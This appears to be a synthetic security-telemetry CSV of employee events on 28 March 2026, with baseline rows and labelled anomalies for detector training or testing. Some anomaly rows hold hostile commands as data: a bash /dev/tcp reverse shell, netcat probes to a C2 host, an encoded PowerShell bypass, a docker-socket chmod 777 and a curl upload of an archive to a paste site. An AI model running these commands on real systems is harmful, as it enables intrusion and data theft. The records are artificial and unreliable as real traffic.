timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-28T12:08:38.586Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,3,0,44.1,916.3,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:11:21.246Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,158.6,391.3,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:14:07.605Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,3,0,82.5,127.4,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:16:31.040Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,3,0,33,381.7,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:20:03.338Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,0,0,225.9,234,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:22:14.371Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,0,1,0,54.5,707.5,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:25:32.048Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,2,0,84.4,1108.6,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:28:07.027Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,0,0,147.1,602.7,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:31:28.880Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,0,0,193.3,502.7,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:34:11.336Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,0,0,147.2,152.2,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:36:38.229Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,2,0,115.1,33.5,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:39:30.984Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,1,2,0,219.1,383.4,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:42:14.795Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,0,0,127.5,423,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:45:34.968Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,0,0,241.6,1164.8,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:48:08.320Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,3,0,51.5,347.1,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:51:11.683Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,SHELL_EXECUTION,0,6,0,44.5,182.8,mega-upload-cloud.ru,chmod 777 /var/run/docker.sock,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-28T12:53:46.653Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,3,0,12,984.2,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T12:56:50.474Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,1,0,171.6,791.4,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:00:07.722Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,1,0,168.6,266.8,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:02:35.462Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,4,0,249.4,922.7,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:05:18.574Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,4,0,238,577.8,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:09:01.472Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,4,0,15.9,739.4,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:11:41.429Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,0,0,253.4,1023,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:14:21.113Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,0,0,124.9,783.4,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:17:41.244Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,1,0,110.9,1154.2,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:20:09.198Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,1,27,0,3477,14152.1,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-28T13:23:10.125Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,2,0,242,116.3,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:26:01.020Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,2,0,161.8,865.8,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:28:40.202Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,3,0,184.4,67.5,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:32:11.827Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,4,0,213.8,1184,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:34:05.331Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,58,448.8,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:37:51.710Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,1,0,128.3,540.7,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:40:15.694Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,4,0,131.3,1057.7,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:43:03.170Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,3,0,160.5,145.4,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:46:12.120Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,1,29,0,8731.3,8320.1,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-28T13:48:40.307Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,1,1,0,217.6,294.3,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:52:14.504Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,1,0,143.3,902,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:55:12.272Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,1,0,142,50,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T13:57:56.079Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,3,0,166.7,643.6,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:00:51.632Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,4,0,156.1,470.4,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:03:11.760Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,4,0,145,263.4,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:06:44.216Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,4,0,84.9,78.5,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:09:18.994Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,3,0,66.5,390,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:12:19.403Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,3,0,79.9,285.1,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:14:49.681Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,157.1,497.6,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:18:09.660Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,4,0,234.3,822.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:20:26.772Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,3,0,32.4,903.5,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:23:52.805Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,1,0,176.3,160.3,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:26:35.451Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,3,0,232.6,245.6,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:29:08.771Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,1,0,193.1,1152.4,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:32:20.591Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,4,0,145.2,163.1,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:34:34.505Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,4,0,54.8,1096.9,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:37:29.857Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,177.7,687,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:40:28.888Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,1,0,246.4,790.4,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:44:09.612Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,3,0,117.4,1134.1,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:46:31.850Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,4,0,108.9,458.8,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:49:08.397Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,4,0,134,136.1,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:52:07.831Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,0,0,210.5,1148.5,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:55:32.216Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,0,128.5,926.1,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T14:57:58.317Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,0,0,245.5,464,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:01:01.594Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,2,0,227.8,568.4,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:04:02.823Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,253.7,664,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:06:47.266Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,0,0,153.5,700.6,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:09:53.086Z,usr-103,carol.zhang,HR,10.0.2.88,USB_ACTIVITY,0,54,1,32633.1,133.3,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-28T15:12:03.893Z,usr-106,frank.miller,IT,10.0.1.50,SHELL_EXECUTION,2,7,0,159.9,26.8,tunnel-ngrok.io,bash -i >& /dev/tcp/185.220.101.4/4444 0>&1,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-28T15:15:02.556Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,4,0,152.8,1169.8,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:18:17.615Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,0,0,181.7,980.5,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:21:37.528Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,3,0,24,176.8,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:24:00.842Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,2,0,185.7,781.6,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:27:03.711Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,2,0,142.1,995.5,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:30:00.264Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,2,0,166.1,882,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:32:42.602Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,1,0,18.1,1105.2,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:35:07.693Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,1,8,0,5843.2,18069,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-28T15:38:16.476Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,1,0,201.9,500.3,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:41:44.801Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,2,0,140.4,527.1,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:44:13.040Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,0,0,132.8,679,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:46:39.793Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,1,0,22.7,1137.1,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:49:56.991Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,2,0,243.6,76.3,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:52:34.010Z,usr-105,elena.rostova,SECURITY,10.0.9.3,SHELL_EXECUTION,0,10,0,263.1,144.3,darknet-gateway.to,powershell -ExecutionPolicy Bypass -enc SQBFAFg...,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-28T15:55:34.621Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,3,0,225.2,175.7,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T15:58:36.370Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,2,0,132.1,841.1,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:01:44.549Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,4,0,73.5,1017.5,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:04:03.623Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,2,0,192.1,1021.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:07:20.111Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,0,0,97.4,253.9,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:10:18.987Z,usr-103,carol.zhang,HR,10.0.2.88,USB_ACTIVITY,0,24,1,72700.6,248.3,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-28T16:12:55.300Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,2,0,74.2,129.7,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:15:31.621Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,2,0,126.2,380.3,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:18:32.378Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,1,0,207,1179.4,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:21:49.421Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,1,4,0,239,1000.7,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:24:54.543Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_DOWNLOAD,0,2,0,181.3,48.4,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:27:08.820Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,4,0,152.1,246.5,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:30:06.636Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,1,21,0,6058.1,10439,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-28T16:33:29.905Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,62.6,1099,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:35:52.635Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,0,0,144.2,371.4,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:38:39.457Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,API_REQUEST,0,1,0,161,206.5,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:42:07.284Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,2,0,160.9,362.2,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:44:16.669Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,213,0,152389.1,115.4,pastebin-raw.io,curl -X POST --data-binary @archive.tar.gz,BLOCKED,1,QUARANTINE,Mass file exfiltration velocity to external site (213 files)
2026-03-28T16:47:17.125Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,1,26,0,6117.6,9749.2,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-28T16:50:17.711Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,0,0,106.9,855.7,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:53:19.572Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,3,0,91.8,427.1,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:56:36.416Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,1,0,162.5,921.8,internal-portal.corp,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T16:59:16.165Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,0,131.7,58.5,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:02:05.401Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,79.6,1117.3,docs.google.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:04:28.687Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,4,0,239.1,963.3,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:07:40.136Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,2,0,148,314.4,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:11:02.230Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,0,0,90.5,489.9,aws.us-east-1.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:13:36.765Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,1,0,133.4,740.7,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:16:32.191Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,77.5,202.5,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:19:23.536Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,2,0,34.8,504,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:22:03.813Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,0,0,173.8,658.5,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:25:16.860Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,1,2,0,80,940.6,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:27:36.234Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,1,0,159.6,823.7,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:30:17.374Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,3,0,52,577.4,sharepoint.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:33:16.868Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,0,0,117,535.4,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:36:46.853Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,3,0,130.3,439.8,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:39:21.556Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,0,4,0,211.1,538.5,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:42:22.411Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,3,0,10.5,1157,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:45:20.161Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,1,0,237.1,887.8,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:48:21.904Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,4,0,93.8,327.8,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:50:25.086Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,4,0,82.4,530.6,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:53:39.240Z,usr-102,bob.martinez,FINANCE,10.0.5.45,API_REQUEST,0,1,0,202.7,153.6,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:56:31.864Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,3,0,48,1026.3,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T17:59:04.444Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,3,0,99.7,1021.9,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-28T18:01:55.596Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,3,0,117.3,259.1,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
